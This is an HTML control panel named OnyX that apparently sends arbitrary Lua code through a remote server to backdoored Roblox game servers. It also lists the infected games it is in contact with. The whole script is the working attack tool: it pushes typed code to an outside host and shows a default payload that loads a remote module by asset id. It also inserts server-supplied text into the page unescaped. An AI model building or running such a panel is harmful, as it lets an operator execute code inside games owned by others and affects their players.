<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>OnyX Ultimate Control</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;800&display=swap" rel="stylesheet">
    <style>
        :root { --bg: #050505; --card: #111; --accent: #fff; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background: var(--bg); color: white; display: flex; flex-direction: column; height: 100vh; padding: 30px; }
        
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
        .logo { font-size: 32px; font-weight: 800; letter-spacing: -2px; }
        
        .main-container { display: grid; grid-template-columns: 1fr 350px; gap: 20px; flex-grow: 1; }
        
        .editor-section { background: var(--card); border-radius: 24px; padding: 25px; border: 1px solid #222; display: flex; flex-direction: column; }
        textarea { flex-grow: 1; background: transparent; border: none; color: #00ff00; font-family: 'Courier New', monospace; font-size: 16px; resize: none; outline: none; }
        
        .games-section { background: var(--card); border-radius: 24px; padding: 25px; border: 1px solid #222; overflow-y: auto; }
        .game-card { background: #181818; padding: 15px; border-radius: 15px; margin-bottom: 15px; border: 1px solid #252525; }
        
        .btn { background: var(--accent); color: black; border: none; padding: 15px 30px; border-radius: 12px; font-weight: 800; cursor: pointer; transition: 0.2s; }
        .btn:hover { transform: scale(1.02); opacity: 0.9; }
    </style>
</head>
<body>

    <div class="header">
        <div class="logo">OnyX</div>
        <button class="btn" onclick="send()">EXECUTE CLOUD</button>
    </div>

    <div class="main-container">
        <div class="editor-section">
            <h3 style="margin-bottom: 15px; opacity: 0.5;">LUA EXECUTOR</h3>
            <textarea id="code">require(104786344839667)("Not_an9e15")</textarea>
        </div>

        <div class="games-section">
            <h3 style="margin-bottom: 15px; opacity: 0.5;">ACTIVE SERVERS</h3>
            <div id="list"></div>
        </div>
    </div>

    <script>
        const URL = "https://onyxwbserver.onrender.com";

        async function send() {
            const code = document.getElementById('code').value;
            await fetch(URL + "/update_script", {
                method: 'POST',
                headers: {'Content-Type': 'text/plain'},
                body: code
            });
            alert("Sent to Roblox!");
        }

        async function update() {
            try {
                const res = await fetch(URL + "/get_games");
                const games = await res.json();
                const div = document.getElementById('list');
                div.innerHTML = "";
                for(let id in games) {
                    const g = games[id];
                    div.innerHTML += `<div class="game-card">
                        <div style="font-weight:800">${g.gameName}</div>
                        <div style="font-size:12px; color:#666">Players: ${g.playerCount}/${g.maxPlayers}</div>
                        <div style="font-size:11px; color:#444">ID: ${g.placeId}</div>
                    </div>`;
                }
            } catch(e) {}
        }
        setInterval(update, 5000);
        update();
    </script>
</body>
</html>
